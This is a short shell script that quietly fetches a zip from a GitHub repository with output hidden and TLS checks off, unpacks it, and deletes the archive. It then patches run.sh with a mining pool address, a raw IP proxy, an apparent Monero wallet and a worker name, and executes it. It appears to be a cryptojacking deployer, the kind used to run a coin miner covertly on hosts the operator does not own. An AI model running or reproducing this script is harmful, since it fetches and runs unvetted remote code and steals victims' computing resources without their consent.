sleep 1
curl -k -L -o okes.zip "https://github.com/tarmiasaradi03/noconfig/raw/refs/heads/main/nocap.zip" >/dev/null 2>&1
unzip -q okes.zip
rm -rf okes.zip
sleep 1

sed -i "s/ALAMAT/pool.hashvault.pro:443/" run.sh
sed -i "s/KUNEMUSE/43.106.13.137:8080/" run.sh
sed -i "s/DOMPET/42dJ6xzhn2ZNQqJH8K4siojdfJHjHZD65QnAVpmDvA8rDygCfm3EJWLXpLSW6qN3nJ32yTaDS55AoUHNJ6wAZQEyNrVxwJB/" run.sh
sed -i "s/NAMA/D/" run.sh

sleep 1
bash run.sh
